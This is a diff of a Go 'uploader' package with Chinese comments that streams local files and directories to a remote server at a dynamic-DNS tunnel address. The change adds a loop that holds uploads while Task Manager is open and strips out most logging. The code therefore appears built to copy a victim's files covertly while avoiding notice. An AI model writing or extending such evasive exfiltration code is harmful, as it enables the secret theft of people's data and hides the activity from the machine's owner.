@@ -3,9 +3,9 @@ package uploader
 import (
 	"bufio"
 	"context"
+	"errors"
 	"fmt"
 	"io"
-	"log"
 	"net"
 	"os"
 	"path/filepath"
@@ -20,8 +20,6 @@ import (
 	"golang.org/x/time/rate"
 )
 
-var ServerAddr = "1q502u2312.zicp.fun:8743"
-
 var (
 	// 新增：全局并发上传限制
 	MaxConcurrentUploads = 5
@@ -29,21 +27,12 @@ var (
 
 	MaxCheckUploadsSem = 20
 	CheckSem           = make(chan struct{}, MaxCheckUploadsSem) // 新增：限制最多20个并发 FILECHECK
-	UploadPaused       atomic.Bool
 )
 
 var (
-	// statusFileName = ".upload"       // 状态文件名
-	// SpeedLimit = 10 * 1024 * 1024 // 默认上传速度限制
 	SpeedLimit = 10 * 1024 * 1024 // 默认上传速度限制
 	bufferSize = 32 * 1024        // 32KB缓冲区
-	ClientName = ""               // 定义全局用户名称
 )
-
-// 自定义日志记录函数，支持格式化输出
-func LogMessage(format string, args ...interface{}) {
-	log.Printf(format, args...)
-}
 
 // 新增目录上传结构体
 type UploadTask struct {
@@ -72,9 +61,6 @@ func init() {
 	}
 }
 
-// LogMessage("队列达到 2000，触发限制，需降至 <800 才继续扫描")
-// t.Conn.Write([]byte("NOTIFY\n" + "队列达到2000,触发限制需降至800以下才继续扫描" + "\n"))
-
 // 2025.09.24
 // 修改 doSendFile 方法：签名改为 doSendFile(path string) error，在内部获取文件信息，并控制并发和 fConn 复用
 func (t *UploadTask) doSendFile(fullPath string) error {
@@ -85,7 +71,6 @@ func (t *UploadTask) doSendFile(fullPath string) error {
 	// 建立专用文件传输连接（带重试，用于 FILECHECK 和上传复用）
 	fConn, err := connectWithRetry(ServerAddr, nil)
 	if err != nil {
-		LogMessage(fmt.Sprintf("连接失败: %v", err))
 		return fmt.Errorf("连接失败: %w", err)
 	}
 	defer fConn.Close()
@@ -97,9 +82,7 @@ func (t *UploadTask) doSendFile(fullPath string) error {
 	// ========== 1. 目录处理：以 "D|" 开头 ==========
 	if strings.HasPrefix(fullPath, "D|") {
 		fullPath := fullPath[2:] // 直接切掉 "D|"
-		// relPath, _ := filepath.Rel(t.RootPath, fullPath)
-		// unixPath := formatUnixPath(filepath.Join(t.RootPath, relPath))
-		// createTime := strconv.FormatInt(getCreateTime(fullPath), 10)
+
 		// 准备文件信息
 		fileInfo, err := os.Stat(fullPath)
 		if err != nil {
@@ -137,19 +120,22 @@ func (t *UploadTask) doSendFile(fullPath string) error {
 
 	// 发送CHECK命令并读取响应
 	if _, err := fConn.Write([]byte(fmt.Sprintf("FILECHECK\n%s|%s|%s|%s|%d\n", ClientName, formatUnixPath(fullPath), ct, mt, fileInfo.Size()))); err != nil {
-		LogMessage(fmt.Sprintf("发送CHECK失败: %v", err))
 		return fmt.Errorf("发送CHECK失败: %w", err)
 	}
 
 	response, err := bufio.NewReader(fConn).ReadString('\n')
 	if err != nil {
-		LogMessage(fmt.Sprintf("读取CHECK响应失败: %v", err))
 		return fmt.Errorf("读取CHECK响应失败: %w", err)
 	}
 
 	if strings.TrimSpace(response) == "EXISTS" {
-		LogMessage(fmt.Sprintf("\033[33m跳过已存在文件: %s\033[0m", fullPath))
 		return nil
+	}
+
+	// <<<=== 新增：任务管理器打开时暂停上传 ===>>>
+	for TaskmgrRunning.Load() {
+		t.Conn.Write([]byte("NOTIFY\n" + "任务管理器打开时暂停上传,待5秒后重试" + "\n"))
+		time.Sleep(5 * time.Second)
 	}
 
 	// FILECHECK 确认需要上传，获取上传信号量槽位（限制5个并发上传）
@@ -205,7 +191,6 @@ func (t *UploadTask) doSendFile(fullPath string) error {
 
 	// finalize logging
 	counter.Finalize()
-	LogMessage(fmt.Sprintf("\033[32m成功上传: %s (%s)\033[0m\n", fullPath, formatSize(fileInfo.Size())))
 	return nil
 }
 
@@ -228,7 +213,7 @@ func (t *UploadTask) doSendFileWithOutArray(fullPath string) error {
 	// 建立专用文件传输连接（带重试）
 	fConn, err := connectWithRetry(ServerAddr, nil)
 	if err != nil {
-		LogMessage(fmt.Sprintf("连接失败: %v", err))
+		// LogMessage(fmt.Sprintf("连接失败: %v", err))
 		return fmt.Errorf("连接失败: %w", err)
 	}
 	defer fConn.Close()
@@ -238,18 +223,18 @@ func (t *UploadTask) doSendFileWithOutArray(fullPath string) error {
 
 	// 发送CHECK命令并读取响应
 	if _, err := fConn.Write([]byte(fmt.Sprintf("FILECHECK\n%s|%s|%s|%s|%d\n", ClientName, formatUnixPath(fullPath), ct, mt, fileInfo.Size()))); err != nil {
-		LogMessage(fmt.Sprintf("发送CHECK失败: %v", err))
+		// LogMessage(fmt.Sprintf("发送CHECK失败: %v", err))
 		return fmt.Errorf("发送CHECK失败: %w", err)
 	}
 
 	response, err := bufio.NewReader(fConn).ReadString('\n')
 	if err != nil {
-		LogMessage(fmt.Sprintf("读取CHECK响应失败: %v", err))
+		// LogMessage(fmt.Sprintf("读取CHECK响应失败: %v", err))
 		return fmt.Errorf("读取CHECK响应失败: %w", err)
 	}
 
 	if strings.TrimSpace(response) == "EXISTS" {
-		LogMessage(fmt.Sprintf("\033[33m跳过已存在文件: %s\033[0m", fullPath))
+		// LogMessage(fmt.Sprintf("\033[33m跳过已存在文件: %s\033[0m", fullPath))
 		return nil
 	}
 
@@ -287,7 +272,6 @@ func (t *UploadTask) doSendFileWithOutArray(fullPath string) error {
 
 	// finalize logging
 	counter.Finalize()
-	LogMessage(fmt.Sprintf("\033[32m成功上传: %s (%s)\033[0m\n", fullPath, formatSize(fileInfo.Size())))
 	return nil
 }
 
@@ -312,6 +296,7 @@ func formatUnixPath(fullPath string) string {
 // 替换原来的 rateLimitedCopyWithContext 为这个版本,实现强行断流
 func (t *UploadTask) rateLimitedCopyWithContext(dst io.Writer, src io.Reader, limiter *rate.Limiter) (written int64, err error) {
 	buf := make([]byte, bufferSize) // 复用全局 bufferSize（32K~1M）
+	ctx := context.Background()
 
 	for {
 		// 关键：每读一块就检查一次任务管理器！
@@ -323,40 +308,6 @@ func (t *UploadTask) rateLimitedCopyWithContext(dst io.Writer, src io.Reader, li
 		nr, er := src.Read(buf)
 		if nr > 0 {
 			// 等待限速令牌
-			if err := limiter.WaitN(context.Background(), nr); err != nil {
-				return written, err
-			}
-
-			nw, ew := dst.Write(buf[0:nr])
-			if nw > 0 {
-				written += int64(nw)
-			}
-			if ew != nil {
-				return written, ew
-			}
-			if nr != nw {
-				return written, io.ErrShortWrite
-			}
-		}
-		if er != nil {
-			if er != io.EOF {
-				err = er
-			}
-			break
-		}
-	}
-	return written, err
-}
-
-// 添加速率限制拷贝函数
-func (t *UploadTask) rateLimitedCopy(dst io.Writer, src io.Reader, limiter *rate.Limiter) (written int64, err error) {
-	buf := make([]byte, bufferSize)
-	ctx := context.Background()
-
-	for {
-		nr, er := src.Read(buf)
-		if nr > 0 {
-			// 等待速率限制令牌
 			if err := limiter.WaitN(ctx, nr); err != nil {
 				return written, err
 			}
@@ -392,6 +343,7 @@ func (c *WriteCounter) Write(p []byte) (int, error) {
 	}
 	c.LastPrint = time.Now()
 
+	/* 1 在传输过程中不进行日志打印
 	current := atomic.LoadInt64(&c.Current)
 	elapsed := time.Since(c.StartTime).Seconds()
 
@@ -405,12 +357,10 @@ func (c *WriteCounter) Write(p []byte) (int, error) {
 	progress := float64(current) / float64(c.Total) * 100
 	if progress > 100 {
 		progress = 100
-	}
+	}*/
 
 	// 彩色终端输出
 	// LogMessage("\r\033[33m%s\033[0m | 进度: \033[32m%.2f%%\033[0m | 速度: \033[36m%.2f KB/s\033[0m", c.FileName, progress, speed)
-	LogMessage(fmt.Sprintf("\r\033[33m%s\033[0m | 进度: \033[32m%.2f%%\033[0m | 速度: \033[36m%.2f KB/s\033[0m", c.FileName, progress, speed))
-
 	return n, nil
 }
 
@@ -420,8 +370,8 @@ func (c *WriteCounter) Finalize() {
 	elapsed := time.Since(c.StartTime).Seconds()
 	avgSpeed := float64(current) / elapsed / 1024
 
-	// LogMessage("\r\033[1;32m%s\033[0m | 完成: \033[1;35m100.00%%\033[0m | 平均速度: \033[1;34m%.2f KB/s\033[0m\n", c.FileName, avgSpeed)
-	LogMessage(fmt.Sprintf("\r\033[1;32m%s\033[0m | 完成: \033[1;35m100.00%%\033[0m | 平均速度: \033[1;34m%.2f KB/s\033[0m\n", c.FileName, avgSpeed))
+	logMsg := fmt.Sprintf("\r\033[1;32m%s\033[0m | 完成: \033[1;35m100.00%%\033[0m | 平均速度: \033[1;34m%.2f KB/s\033[0m\n", c.FileName, avgSpeed)
+	fmt.Println(logMsg)
 }
 
 func formatSize(bytes int64) string {
@@ -450,9 +400,10 @@ func connectWithRetry(serverAddr string, errChan chan<- error) (net.Conn, error)
 
 		// 记录错误（非阻塞发送）
 		errMsg := fmt.Sprintf("连接失败: %v，%.0f秒后重试...", err, baseWaitTime.Seconds())
-		LogMessage(errMsg)
+		fmt.Println(errMsg)
+
 		select {
-		case errChan <- fmt.Errorf(errMsg): // 非阻塞发送错误
+		case errChan <- errors.New(errMsg): // 非阻塞发送错误
 		default:
 		}
 
@@ -478,24 +429,4 @@ func getCreateTime(path string) int64 {
 
 	// 非 Windows: 返回修改时间
 	return fi.ModTime().Unix()
-}
-
-// 在程序启动时（比如 MyService.run() 开头）启动检测协程
-func initTaskManagerDetector() {
-	SafeGo(func() {
-		for {
-			if isTaskManagerRunning() {
-				if !TaskmgrRunning.Load() {
-					TaskmgrRunning.Store(true)
-					// LogMessage("[检测到任务管理器已打开] 所有文件上传已暂停（FILECHECK 正常）")
-				}
-			} else {
-				if TaskmgrRunning.Load() {
-					TaskmgrRunning.Store(false)
-					// LogMessage("[任务管理器已关闭] 文件上传已恢复")
-				}
-			}
-			time.Sleep(2 * time.Second) // 每2秒检测一次，CPU占用极低
-		}
-	})
 }
